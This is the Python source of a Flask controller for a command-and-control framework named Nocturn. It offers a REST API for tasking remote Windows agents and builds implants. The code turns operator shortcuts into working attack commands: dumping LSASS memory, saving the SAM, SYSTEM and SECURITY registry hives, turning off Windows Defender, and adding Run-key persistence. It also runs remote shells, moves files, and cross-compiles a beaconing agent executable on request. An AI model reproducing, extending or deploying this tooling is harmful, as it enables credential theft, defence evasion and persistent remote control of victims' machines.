"""
Nocturn C2 Framework — Controller
REST API + JWT Auth + Agent Build
"""
import os
import re
import time
import shutil
import subprocess
import threading
import tempfile
from collections import deque

from dotenv import load_dotenv
load_dotenv(os.path.join(os.path.dirname(__file__), '.env'))

from flask import Flask, request, jsonify, send_file, render_template, redirect
from flask_jwt_extended import (
    JWTManager, create_access_token,
    jwt_required, get_jwt_identity
)
from flask_cors import CORS
import server

app = Flask(__name__)
CORS(app, resources={r"/api/*": {"origins": "*"}})

# JWT config
app.config["JWT_SECRET_KEY"] = os.getenv("JWT_SECRET_KEY", "fallback-secret-key")
app.config["JWT_ACCESS_TOKEN_EXPIRES"] = 86400  # 24h
jwt = JWTManager(app)

# Admin credentials from .env
ADMIN_USER = os.getenv("ADMIN_USER", "admin")
ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "Nocturn2026!")

# Agent C source path
AGENT_C_PATH = os.path.join(os.path.dirname(os.path.dirname(__file__)), "agent", "agent.c")

# Command history per agent
CMD_HISTORY = {}

HELP_TEXT = """
============== COMMANDES DISPONIBLES ==============

[INFO SYSTEME]
  whoami              Utilisateur courant
  hostname            Nom de la machine
  ipconfig /all       Configuration reseau complete
  systeminfo          Informations systeme detaillees
  net user            Liste les comptes utilisateurs
  net localgroup administrators   Membres du groupe admin

[FICHIERS & NAVIGATION]
  dir                 Liste les fichiers du repertoire courant
  cd <chemin>         Change de repertoire

[PROCESSUS]
  tasklist            Liste les processus en cours
  taskkill /IM <nom.exe> /F   Tue un processus par nom

[RESEAU]
  netstat -ano        Connexions reseau actives
  arp -a              Table ARP

[TRANSFERT DE FICHIERS]
  upload <chemin>     Envoie un fichier vers le serveur
  download <filename> <dest>   Telecharge un fichier

[CREDENTIALS] (admin requis)
  lsass               Dump LSASS
  sam / system / security   Sauvegarde hives registre
  check-admin         Verifie les droits admin

[ANTIVIRUS] (admin requis)
  av-status / av-off / av-on

[PERSISTANCE]
  persistence -n "Nom" -p "C:\\chemin\\app.exe"
  unpersist -n "Nom"
  check-persist

[SHELL INTERACTIF]
  shell cmd.exe / shell powershell.exe
  shell_cmd <commande>
  shell_close

[CONTROLE]
  help / quit
===================================================
""".strip()


def get_history(agent_id):
    if agent_id not in CMD_HISTORY:
        CMD_HISTORY[agent_id] = deque(maxlen=100)
    return CMD_HISTORY[agent_id]


def parse_command(command):
    """Transforme les commandes spéciales en commandes Windows réelles."""
    cmd = command.strip()

    if cmd == "help":
        return None, HELP_TEXT, True

    if cmd.startswith("persistence "):
        match = re.search(r'-n\s+"([^"]+)"\s+-p\s+"([^"]+)"', cmd)
        if not match:
            return None, 'Usage: persistence -n "NomApp" -p "C:\\chemin\\app.exe"', True
        name, path = match.group(1), match.group(2)
        real_cmd = (
            'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
            f'/v "{name}" /t REG_SZ /d "{path}" /f'
        )
        return real_cmd, None, False

    elif cmd.startswith("unpersist "):
        match = re.search(r'-n\s+"([^"]+)"', cmd)
        if not match:
            return None, 'Usage: unpersist -n "NomApp"', True
        name = match.group(1)
        return f'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{name}" /f', None, False

    elif cmd == "check-persist":
        return 'reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"', None, False

    elif cmd == "lsass" or cmd.startswith("lsass "):
        dump_path = "C:\\lsass.dmp" if cmd == "lsass" else cmd[6:].strip().strip('"') or "C:\\lsass.dmp"
        real_cmd = (
            f'powershell -c "$p = (Get-Process lsass).Id; '
            f'rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump $p {dump_path} full"'
        )
        return real_cmd, None, False

    elif cmd == "sam":
        return 'reg.exe save HKLM\\SAM C:\\sam.save', None, False
    elif cmd == "system":
        return 'reg.exe save HKLM\\SYSTEM C:\\system.save', None, False
    elif cmd == "security":
        return 'reg.exe save HKLM\\SECURITY C:\\security.save', None, False

    elif cmd == "av-off":
        return (
            'powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true; '
            'Set-MpPreference -DisableIOAVProtection $true; '
            'Set-MpPreference -DisableBehaviorMonitoring $true; '
            'Write-Host \'[+] Windows Defender disabled\'"'
        ), None, False

    elif cmd == "av-on":
        return (
            'powershell -c "Set-MpPreference -DisableRealtimeMonitoring $false; '
            'Set-MpPreference -DisableIOAVProtection $false; '
            'Set-MpPreference -DisableBehaviorMonitoring $false; '
            'Write-Host \'[+] Windows Defender enabled\'"'
        ), None, False

    elif cmd == "av-status":
        return (
            'powershell -c "Get-MpPreference | Select-Object DisableRealtimeMonitoring, '
            'DisableIOAVProtection, DisableBehaviorMonitoring | Format-List"'
        ), None, False

    elif cmd.startswith("shell ") and not cmd.startswith("shell_"):
        program = cmd[6:].strip()
        if not program:
            return None, "Usage: shell <programme.exe>", True
        return cmd, None, False

    elif cmd.startswith("shell_cmd "):
        subcmd = cmd[10:].strip()
        if not subcmd:
            return None, "Usage: shell_cmd <commande>", True
        return cmd, None, False

    elif cmd == "shell_close":
        return cmd, None, False

    elif cmd == "check-admin":
        return (
            'powershell -c "$isAdmin = ([Security.Principal.WindowsPrincipal]'
            '[Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('
            '[Security.Principal.WindowsBuiltInRole]::Administrator); '
            'if ($isAdmin) { Write-Host \'[+] Agent is running as ADMINISTRATOR\' } '
            'else { Write-Host \'[-] Agent is running as NORMAL USER\' }"'
        ), None, False

    return command, None, False


# ─────────────────────────────────────────
# AUTH
# ─────────────────────────────────────────

@app.route("/api/auth/login", methods=["POST"])
def login():
    data = request.get_json(silent=True) or {}
    username = data.get("username", "")
    password = data.get("password", "")

    if username == ADMIN_USER and password == ADMIN_PASSWORD:
        token = create_access_token(identity=username)
        return jsonify({"access_token": token, "token_type": "bearer"}), 200

    return jsonify({"error": "Identifiants invalides"}), 401


# ─────────────────────────────────────────
# HEALTHCHECK
# ─────────────────────────────────────────

@app.route("/api/health")
def health():
    return jsonify({"status": "ok", "name": "Nocturn", "version": "1.0.0"})


# ─────────────────────────────────────────
# AGENTS API
# ─────────────────────────────────────────

@app.route("/api/agents")
@jwt_required()
def api_agents():
    with server.DATA_LOCK:
        agents = []
        for agent_id, last_seen in server.AGENT_STATUS.items():
            agents.append({
                "id": agent_id,
                "cwd": server.CURRENT_DIRS.get(agent_id, "?"),
                "last_seen": int(time.time() - last_seen),
                "status": "online" if (time.time() - last_seen) < 30 else
                          "idle" if (time.time() - last_seen) < 300 else "offline"
            })
    agents.sort(key=lambda x: x["last_seen"])
    return jsonify(agents)


@app.route("/api/agents/<agent_id>")
@jwt_required()
def api_agent_detail(agent_id):
    with server.DATA_LOCK:
        if agent_id not in server.AGENT_STATUS:
            return jsonify({"error": "Agent non trouvé"}), 404
        last_seen = server.AGENT_STATUS[agent_id]
        return jsonify({
            "id": agent_id,
            "cwd": server.CURRENT_DIRS.get(agent_id, "?"),
            "last_seen": int(time.time() - last_seen),
            "status": "online" if (time.time() - last_seen) < 30 else
                      "idle" if (time.time() - last_seen) < 300 else "offline"
        })


@app.route("/api/agents/<agent_id>/execute", methods=["POST"])
@jwt_required()
def api_execute(agent_id):
    data = request.get_json(silent=True) or {}
    cmd = data.get("command", "").strip()

    if not cmd:
        return jsonify({"error": "Commande vide"}), 400

    real_cmd, message, is_local = parse_command(cmd)

    with server.DATA_LOCK:
        cwd = server.CURRENT_DIRS.get(agent_id, "?")

    if is_local:
        get_history(agent_id).append({
            "command": cmd, "output": message,
            "cwd": cwd, "time": time.strftime("%H:%M:%S")
        })
        return jsonify({"output": message, "cwd": cwd})

    with server.DATA_LOCK:
        if agent_id not in server.AGENT_STATUS:
            return jsonify({"error": "Agent non trouvé"}), 404
        server.CMD_INPUT[agent_id] = real_cmd

    output = None
    for _ in range(60):
        time.sleep(0.5)
        with server.DATA_LOCK:
            if agent_id in server.CMD_OUTPUT:
                output = server.CMD_OUTPUT.pop(agent_id)
                cwd = server.CURRENT_DIRS.get(agent_id, cwd)
                break

    if output is None:
        output = "TIMEOUT: Pas de réponse de l'agent"

    get_history(agent_id).append({
        "command": cmd, "output": output,
        "cwd": cwd, "time": time.strftime("%H:%M:%S")
    })
    return jsonify({"output": output, "cwd": cwd})


@app.route("/api/agents/<agent_id>/history")
@jwt_required()
def api_history(agent_id):
    history = list(get_history(agent_id))
    return jsonify(history)


# ─────────────────────────────────────────
# AGENT BUILDER
# ─────────────────────────────────────────

@app.route("/api/build-agent", methods=["POST"])
@jwt_required()
def build_agent():
    data = request.get_json(silent=True) or {}
    server_host = data.get("server_host", "localhost")
    server_port = int(data.get("server_port", 1234))
    agent_id = data.get("agent_id", "agent-001")
    delay_ms = int(data.get("delay_ms", 3000))

    # Validation basique
    if not server_host or not agent_id:
        return jsonify({"error": "server_host et agent_id sont requis"}), 400

    if not os.path.exists(AGENT_C_PATH):
        return jsonify({"error": "agent.c introuvable"}), 500

    # Compiler dans un répertoire temporaire
    tmpdir = tempfile.mkdtemp()
    try:
        tmp_c = os.path.join(tmpdir, "agent.c")
        shutil.copy(AGENT_C_PATH, tmp_c)

        # Patch les defines avec sed
        subprocess.run(["sed", "-i",
            f's/#define SERVER_HOST.*/#define SERVER_HOST "{server_host}"/',
            tmp_c], check=True)
        subprocess.run(["sed", "-i",
            f's/#define SERVER_PORT.*/#define SERVER_PORT {server_port}/',
            tmp_c], check=True)
        subprocess.run(["sed", "-i",
            f's/#define AGENT_ID.*/#define AGENT_ID "{agent_id}"/',
            tmp_c], check=True)
        subprocess.run(["sed", "-i",
            f's/#define DELAY_MS.*/#define DELAY_MS {delay_ms}/',
            tmp_c], check=True)

        out_exe = os.path.join(tmpdir, f"nocturn-{agent_id}.exe")

        # Cross-compile
        result = subprocess.run(
            ["x86_64-w64-mingw32-gcc", tmp_c, "-o", out_exe,
             "-lwininet", "-lws2_32", "-mwindows"],
            capture_output=True, text=True, timeout=60
        )

        if result.returncode != 0:
            return jsonify({
                "error": "Compilation échouée",
                "details": result.stderr
            }), 500

        return send_file(
            out_exe,
            as_attachment=True,
            download_name=f"nocturn-{agent_id}.exe",
            mimetype="application/octet-stream"
        )

    except subprocess.TimeoutExpired:
        return jsonify({"error": "Timeout de compilation"}), 500
    except FileNotFoundError:
        return jsonify({"error": "mingw (x86_64-w64-mingw32-gcc) non installé sur le serveur"}), 500
    except Exception as e:
        return jsonify({"error": str(e)}), 500
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)


# ─────────────────────────────────────────
# LEGACY HTML (fallback pour compatibilité)
# ─────────────────────────────────────────

@app.route("/")
def index_redirect():
    return redirect("/api/health")


# ─────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────

if __name__ == "__main__":
    # SSL géré par nginx en prod — Flask tourne en HTTP derrière le proxy
    print("🚀 Démarrage API agents (port 1234)...")
    threading.Thread(
        target=server.app.run,
        kwargs={
            "host": "0.0.0.0",
            "port": 1234,
            "debug": False,
        },
        daemon=True
    ).start()
    time.sleep(2)

    print("🌐 Démarrage controller (port 5000)...")
    print("👉 https://nocturn.roadmvn.com")
    app.run(
        host="0.0.0.0",
        port=5000,
        debug=False,
        use_reloader=False,
    )
